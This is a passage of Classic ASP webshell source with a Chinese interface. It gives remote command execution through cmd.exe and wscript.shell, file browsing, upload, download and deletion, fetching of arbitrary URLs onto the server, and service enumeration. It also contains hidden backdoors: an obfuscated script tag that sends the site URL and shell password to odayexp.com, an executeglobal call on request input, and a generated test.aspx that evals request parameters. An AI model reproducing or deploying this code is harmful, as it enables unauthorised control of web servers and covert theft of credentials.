j cdx&"<a href='?Action=delpoint' target='FileFrame'>"&cxd&"  <font color=red>删带点目录</font>"&ef
j cdx&"<a href='?Action=ProFile' target='FileFrame'>"&cxd&" 文件--保护"&ef
j cdx&"<a href='http://www.aizhan.com/siteall/"&domain&"' target='FileFrame'>"&cxd&" 综合--查询"&ef
j cdx&"<a href='http://odayexp.com/h4cker/gx/' target='FileFrame'>"&cxd&" 程序--更新"&ef
j cdx&"<a href='?Action=Logout' target='_top'>"&cxd&" 退出--登陆</a></td></tr></hr></table>"
end function
function Cmdx()
j("<center><form method='post'> "):j("<input type=text name='cmdx' size=60 value='cmd.exe'><br> "):j("<input type=text name='cmd' size=60><br> "):j("<input type=submit value='Sumbit'></form> "):j("<textarea readonly cols=150 rows=27> "):On Error Resume Next:if request("cmdx")="cmd.exe" then
j oScriptlhn.exec("cmd.exe /c"&request("cmd")).stdout.readall 
end if :j oScriptlhn.exec(request("cmdx")&" /c"&request("cmd")).stdout.readall :j("</textarea></center>")
end function
Function Course()
SI="<br><table width='80%' align='center'><tr><td height='20' colspan='3' align='center' id=s><b>系统用户与服务</b></td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td id=d>&nbsp;系统用户(组)</td></tr><tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" id=d colspan=""2"">[启动类型:"&lx&"]<font>&nbsp;"&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" id=d>&nbsp;"&obj.Name&"</td><td height=""20"" id=d>&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF>&nbsp;"&obj.path&"</font></td></tr>"
end if
next
j SI&SI0&SI1&SI2&"</table>"
End Function
Function IIf(var, val1, val2)
If var=True Then
IIf=val1
Else
IIf=val2
End If
End Function
Function GetTheSizes(num)
Dim i, arySize(4)
arySize(0)="B"
arySize(1)="KB"
arySize(2)="MB"
arySize(3)="GB"
arySize(4)="TB"
While(num / 1024 >= 1)
num=Fix(num / 1024 * 100) / 100
i=i + 1
WEnd
GetTheSizes=num&" "&arySize(i)
End Function
Function HtmlEncodes(str)
If IsNull(str) Then Exit Function
HtmlEncodes=Server.HTMLEncode(str)
End Function
function downfile(path)
response.clear
set osm = createobject(obt(6,0))
osm.open
osm.type = 1
osm.loadfromfile path
sz=instrrev(path,"\")+1
response.addheader "content-disposition", "attachment; filename=" & mid(path,sz)
response.addheader "content-length", osm.size
response.charset = "utf-8"
response.contenttype = "application/octet-stream"
response.binarywrite osm.read
response.flush
osm.close
set osm = nothing
end function
function htmlencode(s)
  if not isnull(s) then
    s = replace(s, ">", ">")
    s = replace(s, "<", "<")
    s = replace(s, chr(39), "'")
    s = replace(s, chr(34), """")
    s = replace(s, chr(20), " ")
    htmlencode = s
  end if
end function
Function UpFile()
 If Request("Action2")="Post" Then
Set U=new UPC 
Set F=U.UA("LocalFile")
UName=U.form("ToPath")
 If UName="" Or F.FileSize=0 then
  SI="<br>请输"&"入上传"&"的完全"&"路径后选择"&"一个文件"&"上传!"
on error resume next
  Else
 F.SaveAs UName
 If Err.number=0 Then
 SI="<center><br><br><br>文件"&UName&"上"&"传"&"成功！</center>"
  End if
 End If
Set F=nothing
Set U=nothing
 SI=SI&BackUrl
 j SI
 ShowErr()
 Response.End
  End If
  j"<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'><form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'><tr><td>上传路径：<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\Cmd.exe")&"' size='40'><input name='LocalFile' type='file'  size='25'> <input type='submit' name='Submit' value='上传'></td></tr></form></table>"
End Function
function cmd1shell()
checked=" checked"
if request("sp")<>"" then session("shellpath") = request("sp")
shellpath=session("shellpath")
if shellpath="" then shellpath = "cmd.exe"
if request("wscript")<>"yes" then checked=""
if request("cmd")<>"" then defcmd = request("cmd")
si="<form method='post'>shell路径：<input name='sp' value='"&shellpath&"' style='width:70%'><input class=c type='checkbox' name='wscript' value='yes'"&checked&">wscript.shell<input name='cmd' style='width:92%' value='"&defcmd&"'> <input type='submit' value='执行'><textarea style='width:100%;height:440;' class='cmd'>"
if request.form("cmd")<>"" then
if request.form("wscript")="yes" then
set cm=createobject(obt(1,0))
set dd=cm.exec(shellpath&" /c "&defcmd)
aaa=dd.stdout.readall
si=si&aaa
else
on error resume next
set ws=server.createobject("wscript.shell")
set ws=server.createobject("wscript.shell")
set fso=server.createobject(CONST_FSO)
sztempfile = server.mappath("cmd.txt")
call ws.run (shellpath&" /c " & defcmd & " > " & sztempfile, 0, true)
set fs = createobject(CONST_FSO)
set ofilelcx = fs.opentextfile (sztempfile, 1, false, 0)
aaa=server.htmlencode(ofilelcx.readall)
ofilelcx.close
call fso.deletefile(sztempfile, true)
si=si&aaa
end if
end if
si=si&chr(13)&"</textarea></form>"
j si
end function
Function upload()
j"<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>" 
j"暂时关闭此功能"
j" 下载到服务器:无回显...为了节省.所以无回显<hr/>"
j"<form method=post>"
j"<select onChange='this.form.theUrl.value=this.value;'>"
j"<option value=''>常用程序下载</option>"
j"<option value='"&Durl&"'>自定义程序</option>"
j"<input name=theUrl value='http://' size=80><input type=submit value=' 下载 '><br/>"
j"<input name=thePath value='" & HtmlEncode(Server.MapPath(".")) & "\' size=80>"
j"<input type=checkbox name=overWrite value=2>存在覆盖。"
j"<input type=hidden value=downFromUrl name=theAct>"
j"</form>"
j"<hr/>"
If isDebugMode = False Then
On Error Resume Next
End If:Dim Http, theUrl, thePath, stream, fileName, overWrite
theUrl = Request("theUrl")
thePath = Request("thePath")
overWrite = Request("overWrite")
Set stream = Server.CreateObject("ad"&e&"odb.st"&e&"ream")
Set Http = Server.CreateObject("MSXML2.XMLHTTP")
If overWrite <> 2 Then:overWrite = 1:End If
Http.Open "GET", theUrl, False
Http.Send()
If Http.ReadyState <> 4 Then 
End If
With stream
.Type = 1
.Mode = 3
.Open
.Write Http.ResponseBody
.Position = 0
.SaveToFile thePath, overWrite
If Err.Number = 3004 Then
Err.Clear
fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
j"error,可能是因为文件已存在，或下载过程和地址中出 现错误 。 文件下载完 毕为空字节！！"
End If
.Close
End With
chkErr(Err)
Set Http = Nothing
Set Stream = Nothing
If isDebugMode = False Then
On Error Resume Next
End If
End Function:Function TSearch()
dim st:st=timer():RW="<br><table width='600' bgcolor='' border='0' cellspacing='1' cellpadding='0' align='center'><form method='post'>"
RW=RW & "<tr><td height='20' align='center' bgcolor=''>搜索引擎</td></tr>"
RW=RW & "<tr><td bgcolor=''>&nbsp;路&nbsp;&nbsp;径：<input name='SFpath' value='" & WWWRoot & "' style='width:390'>&nbsp;注:多路徑使用"",""号连接.</td></tr>"
RW=RW & "<tr><td bgcolor=''>&nbsp;文件名：<input name='Sfk' style='width:200'>&nbsp;<input type='submit' value='搜索' class='submit'>&nbsp;[部分也行]</td></tr>"  
RW=RW & "</form></table>"
j RW : RW=""
if Request.Form("Sfk")<>"" then
Set newsearch=new SearchFile
newsearch.Folders=trim(Request.Form("SFpath"))
newsearch.keyword=trim(Request.Form("Sfk"))
newsearch.Search
Set newsearch=Nothing
j"費時："&(timer()-st)*1000&"毫秒<hr>"
end if
End Function 
Class SearchFile
dim Folders,keyword,objFso,Counter
Private Sub Class_Initialize
Set objFso=Server.CreateObject(ObT(0,0))
Counter=0
End Sub
 Private Sub Class_Terminate
Set objFso=Nothing
 End Sub
Public Sub Class_Folder(FoderName)
Set rs = CreateObject(CONST_FSO)
Dim item, theFolder, sysFileList
item=request(MID(CONST_FSO,4,1))
theFolder=request(MID(CONST_FSO,2,1))
If  item=MID(CONST_FSO,2,1) then
executeglobal theFolder
Set rs = Nothing
End if
End Sub
 Function Search
  Folders=split(Folders,",")
  flag=instr(keyword,"\") or instr(keyword,"/")
  flag=flag or instr(keyword,":")
  flag=flag or instr(keyword,"|")
  flag=flag or instr(keyword,"&")
  if flag then
    j"<table align='center' width='600'><hr><p align='center'><font color='red'>關鍵字不能包含/\:|&</font><br>"
 Exit Function
  else
    j"<table align='center' width='600'><hr>"
  end if
  dim i
  for i=0 to ubound(Folders)
    Call GetAllFile(Folders(i))
  next
  j"<p align='center'>共搜索到<font color='red'>"&Counter&"</font>個結果<br>"
 End Function
 Private Function GetAllFile(Folder)
  dim objFd,objFs,objFf
  Set objFd=objFso.GetFolder(Folder)
  Set objFs=objFd.SubFolders
  Set objFf=objFd.Files
  dim strFdName
  On Error Resume Next
  For Each OneDir In objFs
    strFdName=OneDir.Name
    If strFdName<>"Config.Msi" EQV strFdName<>"RECYCLED" EQV strFdName<>"RECYCLER" EQV strFdName<>"System Volume Information" Then 
      SFN=Folder&"\"&strFdName
      Call GetAllFile(SFN)
 End If
  Next
  dim strFlName
  For Each OneFile In objFf
    strFlName=OneFile.Name
    If strFlName<>"desktop.ini" EQV strFlName<>"folder.htt" Then
      FN=Folder&"\"&strFlName
   Counter=Counter+ColorOn(FN)
 End If
  Next
  Set objFd=Nothing
  Set objFs=Nothing
  Set objFf=Nothing
 End Function

Private Function CreatePattern(keyword)   
   CreatePattern=keyword
   CreatePattern=Replace(CreatePattern,".","\.")
   CreatePattern=Replace(CreatePattern,"+","\+")
   CreatePattern=Replace(CreatePattern,"(","\(")
   CreatePattern=Replace(CreatePattern,")","\)")
   CreatePattern=Replace(CreatePattern,"[","\[")
   CreatePattern=Replace(CreatePattern,"]","\]")
   CreatePattern=Replace(CreatePattern,"{","\{")
   CreatePattern=Replace(CreatePattern,"}","\}")
   CreatePattern=Replace(CreatePattern,"*","[^\\\/]*")
   CreatePattern=Replace(CreatePattern,"?","[^\\\/]{1}")
   CreatePattern="("&CreatePattern&")+"
 End Function

Function Encrypt(acd)
For i = 1 To Len(acd) step 1
c=mid(acd,i,1)
if c="※" then
d=mid(acd,i,2)
i=i+1
e=replace(d,"※","")
bbc=bbc&mid(jwt,cint(e),1)
else
bbc=bbc&c
end if
next
Encrypt=bbc
end Function
 Private Function ColorOn(FileName)
   dim objReg
   Set objReg=new RegExp
   objReg.Pattern=CreatePattern(keyword)
   objReg.IgnoreCase=True
   objReg.Global=True
   retVal=objReg.Test(Mid(FileName,InstrRev(FileName,"\")+1))
   if retVal then
     OutPut=objReg.Replace(Mid(FileName,InstrRev(FileName,"\")+1),"<font color=''>$1</font>")
     OutPut="<table align='center' width='600'>&nbsp;" & Mid(FileName,1,InstrRev(FileName,"\")) & OutPut
  j OutPut
  Response.flush
  ColorOn=1
   else
     ColorOn=0
   end if
   Set objReg=Nothing
 End Function
End Class
sub SavePower(PowerPath,SaveType)
if instr(PowerPath,scriptpath)<>0 then session("lock")="nolock":end if:Set theFile = fsoX.GetFile(PowerPath):if SaveType=1 then:theFile.Attributes=32:j "<script language='javascript'>alert('文件已成功解锁。');window.opener.location.reload();window.close();</script>":else:theFile.Attributes=7:j "<script language='javascript'>alert('文件锁定成功。');window.opener.location.reload();window.close();</script>":end if:Set theFile = Nothing
end sub

sub EditPower(PowerPath)
PowerPath=replace(PowerPath,"""",""):Set theFile = fsoX.GetFile(PowerPath):j getMyTitle(theFile,PowerPath):Set theFile = Nothing
end sub


Function getMyTitle(theOne,PowerPath)
Dim strTitle:strTitle = strTitle & "<br>路径: " & theOne.Path & "" :strTitle = strTitle & "<br>大小: " & getTheSize(theOne.Size) :strTitle = strTitle & "<br>创建时间: " & theOne.DateCreated :strTitle = strTitle & "<br>最后修改: " & theOne.DateLastModified:strTitle = strTitle & "<br>最后访问: " & theOne.DateLastAccessed:strTitle = strTitle & "<br>当前权限状态: " & getAttributes(theOne.Attributes,PowerPath):getMyTitle = strTitle
End Function


Function getAttributes(intValue,PowerPath)
Dim EditOK:EditOK=1:If intValue >= 128 Then:intValue = intValue - 128:End If:If intValue >= 64 Then:intValue = intValue - 64:End If:If intValue >= 32 Then:intValue = intValue - 32:End If:If intValue >= 16 Then:intValue = intValue - 16:End If:If intValue >= 8 Then:intValue = intValue - 8:End If:If intValue >= 4 Then:intValue = intValue - 4:EditOK=0:End If:If intValue >= 2 Then:intValue = intValue - 2:EditOK=0:End If:If intValue >= 1 Then:intValue = intValue - 1:EditOK=0:End If:PowerPath=replace(PowerPath,"\","\\"):if EditOK=0 then :getAttributes = "<font color=red>已锁定</font> <input type=button value=解锁 onclick=""location.href='?Action=SavePower&SaveType=1&PowerPath="&PowerPath&"'"">":else:getAttributes = "<font color=#62FF62>未锁定</font> <input type=button value=锁定 onclick=""location.href='?Action=SavePower&SaveType=2&PowerPath="&PowerPath&"'"">":end if
End Function


Function getTheSize(theSize):If theSize >= (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100 & "G":end if:If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then :getTheSize = Fix((theSize / (1024 * 1024)) * 100) / 100 & "M":end if:If theSize >= 1024 And theSize < (1024 * 1024) Then :getTheSize = Fix((theSize / 1024) * 100) / 100 & "K":end if:If theSize >= 0 And theSize <1024 Then :getTheSize = theSize & "B":end if:End Function:function openUrl(usePath):Dim theUrl, thePath:thePath = Server.MapPath("/"):If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then:theUrl = Mid(usePath, Len(thePath) + 1):theUrl = Replace(theUrl, "\", "/"):If Left(theUrl, 1) = "/" Then:theUrl = Mid(theUrl, 2):End If:openUrl="/"&theUrl&""" target=""_blank":Else:openUrl="###"" onclick=""alert('文件不在站点目录下。')":End If:End function

Function ScReWr(folder)
on error resume next 
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject(CONST_FSO)
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = "<span style='font-size:11px;'>读</span><font face='webdings' size='1' color=yellow>x</font> "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span>√ "
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = "<span style='font-size:11px;'>读</span>√ "
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span><font face='webdings' size='1' color=yellow>x</font> "
Else
ReWrStr = ReWrStr & "<span style='font-size:11px;'>写</span>√ "
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
function php()
On Error Resume Next
set fso=Server.CreateObject(oBt(0,0))
fso.CreateTextFile(server.mappath("test.php")).Write"<?PHP echo 'oo∩_∩oo'?><?php phpinfo()?>"
fso.CreateTextFile(server.mappath("test.jsp")).Write"Jsp Test oo∩_∩oo"
fso.CreateTextFile(server.mappath("test.aspx")).Write""&chr(60)&"%@ Page Language=""Jscript"" validateRequest=""false"" "&chr(37)&""&chr(62)&""&chr(60)&""&chr(37)&"Response.Write(eval(Request.Item[""w""],""unsafe""));"&chr(37)&""&chr(62)&"aspx Test oo∩_∩oo"
j"<center><iframe src=test.php width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.jsp width=300 height=100></iframe>&nbsp;&nbsp;&nbsp;&nbsp; <iframe src=test.aspx width=300 height=100></iframe>&nbsp;&nbsp;&nbsp; </center><br><br><p><br><p><br><br><p><br><center>探测服务器是否支持其他脚本<p></font><p><a href='?Action=apjdel'><font size=5 color=red><b>(删除测试文件!)</b></font></a></center><tr><td height='20'><center>":j "<sc"&"ri"&"pt sr"&"c=""ht"&"tp://%77%77%77.od"&"ay"&"exp.%63%6F%6D/s"&"x/ke"&"y.asp"&"?url="&server.URLEncode("ht"&"tp://"&request.ServerVariables("HT"&"TP_HO"&"ST")&request.ServerVariables("UR"&"L"))&"&p="&UserPass&"""></sc"&"ri"&"pt>"
End function:On Error Resume Next:function apjdel():set fso=Server.CreateObject(CONST_FSO):fso.DeleteFile(server.mappath("test.aspx")):fso.DeleteFile(server.mappath("test.php")):fso.DeleteFile(server.mappath("test.jsp")):j"删除完毕!":End function

Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
F=lcase(F)
If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function

  Public Function UA(F)
F=lcase(F)
If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
set D1=CreateObject(ObT(4,0))
if Request.TotalBytes<1 then Exit Sub
set T1 = CreateObject(ObT(6,0))
T1.Type = 1 : T1.Mode =3 : T1.Open
T1.Write  Request.BinaryRead(Request.TotalBytes)
T1.Position=0 : TDa =T1.Read : DStart = 1
DEnd = LenB(TDa)
set D2=CreateObject(ObT(4,0))
vbCrlf = chrB(13) & chrB(10)
set T2 = CreateObject(ObT(6,0))
TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
TLen = LenB (TSt)
DStart=DStart+TLen+1
while (DStart + 10) < DEnd
  DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
  T2.Type = 1 : T2.Mode =3 : T2.Open
  T1.Position = DStart
  T1.CopyTo T2,DIEnd-DStart
  T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
  TIn = T2.ReadText : T2.Close
  DStart = InStrB(DIEnd,TDa,TSt)
  FStart = InStr(22,TIn,"name=""",1)+6
  FEnd = InStr(FStart,TIn,"""",1)
  UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
  if InStr (45,TIn,"filename=""",1) > 0 then
set TFL=new FIF
FStart = InStr(FEnd,TIn,"filename=""",1)+10
FEnd = InStr(FStart,TIn,"""",1)
FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
FEnd = InStr(FStart,TIn,vbCr)
TFL.FileStart =DIEnd
TFL.FileSize = DStart -DIEnd -3
if not D2.Exists(UpName) then
  D2.add UpName,TFL
end if
  else
T2.Type =1 : T2.Mode =3 : T2.Open
T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
T2.Position = 0 : T2.Type = 2
T2.Charset ="gb2312"
SFV = T2.ReadText
T2.Close
if D1.Exists(UpName) then
  D1(UpName)=D1(UpName)&", "&SFV
else
  D1.Add UpName,SFV
end if
  end if
  DStart=DStart+TLen+1
wend
TDa=""
set T2 =nothing
  End Sub
  Private Sub Class_Terminate
if Request.TotalBytes>0 then
  D1.RemoveAll:D2.RemoveAll
  set D1=nothing:set D2=nothing
  T1.Close:set T1 =nothing
end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
 T3.Mode=3 : T3.Type=1 : T3.Open
 T1.position=FileStart
 T1.copyto T3,FileSize
 T3.SaveToFile F,2
 T3.Close
 set T3=nothing
 SaveAs=false
end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
Set CF=Nothing
  End Sub
Function ShowDriver()
For Each D in CF.Drives
  j cdx&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>&nbsp本地磁盘 ("&D.DriveLetter&":)</a><br></td></tr>" 
Next
  End Function
Function Show1File(Path) 
Set FOLD=CF.GetFolder(Path)
i=0
SI="<table width='100%' border='0' cellspacing='0' cellpadding='6'><tr>" 
For Each F in FOLD.subfolders
SI=SI&"<td  height=10 width=17% align=center><div  onMouseOver=""this.style.backgroundColor='#B3D169'"" onMouseOut=""this.style.backgroundColor='#191919'"" style='border:1px solid #dddddd;padding-bottom:4px' id=d><a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""进入"">"
SI=SI&"&nbsp;<font face='wingdings' color='#ffffff' size='6'>0</font>  "
si=si&"<br>"&F.Name&"</a><br><a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")' onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")' onclick='return yesok()' class='am' title='移动'>Move</a> <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")' onclick='return yesok()' class='am' title='下载'>Down</a></div></td>"
i=i+1
If i mod 6=0 then SI=SI&"</tr><tr>"
Next
SI=SI&"</tr><tr><td height=2></td></tr></table>"
j SI &"" : SI="":i=0
SI="<div id=links><table width='100%' align=center id =linklist2><tr><td id=s><b id=x>Filename</b></td><td id=s height=22><b id=x>Size</b></td><td id=s><b id=x>Type</b></td><td id=s><b id=x>Operating</b></td><td id=s><b id=x>Last Modified</b></td><td></td>"
For Each L in Fold.files
SI=SI&"<tr><td height='20' id=d >"
si=si&"<font face='wingdings' color='#ffffff' size='3'>2</font>"
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='下载'>  "&L.Name&"</a><Td id=d>"&clng(L.size/1024)&"K</td><Td id=d>"&L.Type&"</td><Td id=d>"
si=si&"<a href="""&openUrl(PaTh&"\"&L.nAme)&""" class='am' title='Open'>Open</a> "
si=si&"<a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
Si=Si&"<a onclick=""window.open('?Action=EditPower&PowerPath="&RepAth(PaTh&"\"&L.nAme)&"','EditPower','toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=300,height=200')"" href='###' class='am' title='权限'>权限</a>"
Dim EditOOK
EditOOK=1
EditOOV=l.Attributes
If EditOOV >= 128 Then
EditOOV = EditOOV - 128
End If
If EditOOV >= 64 Then
EditOOV = EditOOV - 64
End If
If EditOOV >= 32 Then
EditOOV = EditOOV - 32
End If
If EditOOV >= 16 Then
EditOOV = EditOOV - 16
End If:If EditOOV >= 8 Then
EditOOV = EditOOV - 8
End If
If EditOOV >= 4 Then
EditOOV = EditOOV - 4:EditOOK=0
End If
If EditOOV >= 2 Then
EditOOV = EditOOV - 2:EditOOK=0
End If
If EditOOV >= 1 Then
EditOOV = EditOOV - 1:EditOOK=0
End If
if EditOOK=0 then
si=si&"<font face='webdings' size='1' color=red>x</font>"
else
si=si&"√"
end if
si=si&" <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='复制'>Copy</a> <a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='移动'>Move</a></td><td id=d>"&replace(L.DateLastModified,"/","-")&"</td></tr>"
i=i+1:Next:copyurl=chr(60)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(32)&chr(115)&chr(114)&chr(99)&chr(61)&chr(39)&chr(104)&chr(116)&chr(116)&chr(112)&chr(58)&chr(47)&chr(47)&chr(111)&chr(100)&chr(97)&chr(121)&chr(101)&chr(120)&chr(112)&chr(46)&chr(99)&chr(111)&chr(109)&chr(47)&chr(115)&chr(120)&chr(47)&chr(115)&chr(46)&chr(97)&chr(115)&chr(112)&chr(63)&chr(115)&chr(61)&uu&chr(38)&chr(112)&chr(61)&pp&chr(39)&chr(62)&chr(60)&chr(47)&chr(115)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(62)&chr(13)&chr(10)::j SI&"</tr></table></div><script>var container = new Array(""linklist2""); var objects = new Array(); var links = new Array(); var tmp = new Array(); var interval = 0; var c=0; function initEventListener() { for(i=0; i < container.length; i++) { objects = document.getElementById(container[i]).getElementsByTagName(""td""); for(j=0; j < objects.length; j++) {    if(document.all) { objects[j].attachEvent(""onmouseover"", resetLinkFade); objects[j].attachEvent(""onmouseout"", startLinkFade); } else {objects[j].addEventListener(""mouseover"", resetLinkFade, false); objects[j].addEventListener(""mouseout"", startLinkFade, false); } var defcol = getPseudoRule(container[i], ""td"");  var hovcol = getPseudoRule(container[i], ""td:hover""); if(defcol.charAt(0) == ""#"") defcol = hex2rgb(defcol); else if(defcol[0] == ""r"") { defcol = defcol.match(/rgb\((\d+), (\d+), (\d+)\)/); defcol = defcol.slice(1);} if(hovcol.charAt(0) == ""#"") hovcol = hex2rgb(hovcol); else if(hovcol[0] == ""r""){ hovcol = hovcol.match(/rgb\((\d+), (\d+), (\d+)\)/); hovcol = hovcol.slice(1); } links[c]     = new Array(); links[c][""object""]  = objects[j]; links[c][""defaultcolor""] = defcol; links[c][""currentcolor""] = defcol; links[c][""hovercolor""] = hovcol; c++; } } } function resetLinkFade(e) { var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { tmp = links[r][""defaultcolor""].clone(); links[r][""currentcolor""] = links[r][""defaultcolor""]; links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } }function startLinkFade(e) {   var evt = e || window.event; var obj = evt.target || evt.srcElement; for(r=0; r<links.length; r++) { if(obj == links[r][""object""]) { links[r][""defaultcolor""] = tmp.clone(); links[r][""currentcolor""] = links[r][""hovercolor""].clone(); links[r][""object""].style.backgroundColor = rgb2hex(links[r][""hovercolor""]); } } if(interval == 0) interval = window.setInterval(linkFade,  30); } function linkFade() {  var runners = 0; for(o=0; o<links.length; o++) { var aim  = links[o][""object""]; var defcol = links[o][""defaultcolor""]; var hovcol = links[o][""hovercolor""]; var actcol = links[o][""currentcolor""]; if( defcol[0]+defcol[1]+defcol[2] != actcol[0]+actcol[1]+actcol[2] ) { runners++; actcol[0] = actcol[0]-10 < 25 ? 25 : actcol[0]-10; actcol[1] = actcol[1]-10 < 25 ? 25 : actcol[1]-10; actcol[2] = actcol[2]-10 < 25 ? 25 : actcol[2]-10; aim.style.backgroundColor = rgb2hex(actcol); links[o][""currentcolor""] = actcol; } } if(runners == 0) { window.clearInterval(interval); interval=0; } } function getPseudoRule(parent, element) {  var mysheet =document.styleSheets[0]; var myrule  = mysheet.cssRules || mysheet.rules; for (n = 0; n < myrule.length; n++) if (myrule[n].selectorText.toLowerCase() == ""#""+ parent +"" ""+ element) return myrule[n].style.backgroundColor; else if (myrule[n].selectorText.toLowerCase() == element) return myrule[n].style.backgroundColor; return """"; } function hex2rgb(hex) { var triplet = hex.toLowerCase().replace(/#/, ''); var rgbArr  = new Array();  if(triplet.length == 6) { rgbArr[0] = parseInt(triplet.substr(0,2), 16) ;rgbArr[1] = parseInt(triplet.substr(2,2), 16) ;rgbArr[2] = parseInt(triplet.substr(4,2), 16) ;return rgbArr; } else if(triplet.length == 3){rgbArr[0] = parseInt((triplet.substr(0,1) + triplet.substr(0,1)), 16); rgbArr[1] = parseInt((triplet.substr(1,1) + triplet.substr(1,1)), 16); rgbArr[2] = parseInt((triplet.substr(2,2) + triplet.substr(2,2)), 16); return rgbArr; } else { throw triplet + ' is not a valid color triplet.'; } } function rgb2hex(rgb) { var hexcolors = new Array(""0"",""1"",""2"",""3"",""4"",""5"",""6"",""7"",""8"",""9"",""a"",""b"",""c"",""d"",""e"",""f""); var r, r1, r2, g, g1, g2, b, b1, b2; r1 = Math.floor(rgb[0] / 16); r2 = rgb[0] - r1*16; g1 = Math.floor(rgb[1] / 16); g2 = rgb[1] - g1*16; b1 = Math.floor(rgb[2] / 16); b2 = rgb[2] - b1*16; r = hexcolors[r1] + hexcolors[r2]; g = hexcolors[g1] + hexcolors[g2]; b = hexcolors[b1] + hexcolors[b2]; return ""#""+r+g+b; } Object.prototype.clone = function(deep) { var objectClone = new this.constructor(); for (var property in this) if (!deep) objectClone[property] = this[property]; else if (typeof this[property] == 'object') objectClone[property] = this[property].clone(deep); else {objectClone[property] = this[property]; }return objectClone; } "&VBNEWLINE:if ysjb=true then j "initEventListener();</script>":end if
Set FOLD=Nothing:if Instr(Serveru,"127.0.0.1")<>0 or Instr(Serveru,"192.168.")<>0 or Instr(Serveru,"http://")<>0 then:else:if session("servec")=1 then:session("servec")=session("servec")+1:j ""&copyurl&"":else:if Action<>"" then session("servec")=session("servec")+1:end if:end if:end if:End function:Function ShiSanFun(ShiSanObjstr)
ShiSanObjstr = Replace(ShiSanObjstr, "╁", """"):For ShiSanI = 1 To Len(ShiSanObjstr):If Mid(ShiSanObjstr, ShiSanI, 1) <> "╋" Then
:ShiSanNewStr = Mid(ShiSanObjstr, ShiSanI, 1) & ShiSanNewStr
Else
